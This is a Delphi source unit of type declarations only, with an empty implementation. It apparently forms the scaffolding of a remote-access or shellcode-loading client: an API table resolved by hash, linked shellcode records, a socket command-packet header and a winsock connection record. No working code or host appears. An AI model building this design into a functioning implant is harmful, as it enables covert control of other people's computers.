unit untUtils;

interface

uses
  Windows, winsock;

type
  TAPIRec = packed record
    hKernel32, hUser32, hShell32, hShFolder, hAdvapi32, hNtdll: Cardinal;
    xGetProcAddressEx:function(hBase, hHash, dwLen:Cardinal):Pointer;stdcall;
    xGetProcAddress:function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
    xAllocMem:function(pAPI:Pointer; dwSize:Cardinal):Pointer;stdcall;
    xFreeMem:procedure(pAPI:Pointer; pData:Pointer);stdcall;
    xExitProcess:procedure(uExitCode: UINT); stdcall;
    xCompressMemory:function(pAPI:Pointer; lpMemory: Pointer; var dwSize: Cardinal): Pointer;stdcall;
    xDecompressMemory:function(pAPI:Pointer; lpMemory: Pointer; dwSize: Cardinal; dwOutputSize:Cardinal): Pointer;stdcall;
    xLoadLibraryW:function(lpLibFileName: PChar): Cardinal; stdcall;
    xMessageBoxW:function(hWnd: HWND; lpText, lpCaption: PWideChar; uType: UINT): Integer; stdcall;
    xVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
    xlstrlenW:function(lpString: PWideChar): Integer; stdcall;
    xlstrcmpW:function(lpString1, lpString2: PWideChar): Integer; stdcall;
    xlstrcatW:function(lpString1, lpString2: PWideChar): PWideChar; stdcall;
    xwsprintfW:function(Output: PWideChar; Format: PWideChar): Integer; cdecl varargs;
    xVirtualFree:function(lpAddress: Pointer; dwSize, dwFreeType: DWORD): BOOL; stdcall;
    xZeroMemory:procedure(var Dest; count: Integer);stdcall;
    xCopyMemory:procedure(Destination: Pointer; Source: Pointer; Length: DWORD);stdcall;
    xRtlGetCompressionWorkSpaceSize: function (CompressionFormatAndEngine: ULONG; CompressBufferWorkSpaceSize, CompressFragmentWorkSpaceSize : PULONG): Cardinal; stdcall;
    xRtlCompressBuffer:function(CompressionFormatAndEngine: ULONG; SourceBuffer: Pointer; SourceBufferLength: ULONG; DestinationBuffer: Pointer; DestinationBufferLength: ULONG;SourceChunkSize: ULONG; pDestinationSize: PULONG; WorkspaceBuffer: Pointer): Cardinal; stdcall;
    xRtlDeCompressBuffer:function (CompressionFormatAndEngine:ULONG; DestinationBuffer: Pointer; DestinationBufferLength: ULONG; SourceBuffer: Pointer; SourceBufferLength: ULONG;pDestinationSize: PULONG): Cardinal; stdcall;
  end;
  PAPIRec = ^TAPIRec;

type
  LPSocketHeader = ^TSocketHeader;
  TSocketHeader = packed Record
    bCommand: Byte;
    dwStreamID: DWORD;
    dwPacketLen: DWORD;
    dwDecompressedLen: DWORD;
    dwTotalLen: DWORD;
  end;

type
  TShellCode = packed record
    dwLen:Cardinal;
    dwID:Cardinal;
    pData:Pointer;
  end;
  PShellCode = ^TShellCode;

type
  PShellCodeRec = ^TShellCodeRec;
  TShellCodeRec = packed record
    dwID:Cardinal;
    dwLen:Cardinal;
    pShellCode:Pointer;
    pReserved:Pointer;
    nextShellCode:PShellCodeRec;
  end;

type
  TConnRec = packed record
    pAPI:PAPIRec;
    pShellCode:PShellCodeRec;
    hWinsock:Integer;
    xWSAStartup:function(wVersionRequired: word; var WSData: TWSAData): Integer; stdcall;
    xsocket:function(af, Struct, protocol: Integer): TSocket; stdcall;
    xhtons:function(hostshort: u_short): u_short; stdcall;
    xinet_addr:function(cp: PChar): u_long; stdcall;
    xgethostbyname:function(name: PChar): PHostEnt; stdcall;
    xconnect:function(s: Integer; var name: TSockAddr; namelen: Integer): Integer; stdcall;
    xsend:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
    xrecv:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
    xSendBuffer:function(pConn:Pointer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer; bCompress:Boolean): Boolean;
  end;
  PConnRec = ^TConnRec;

implementation

end.
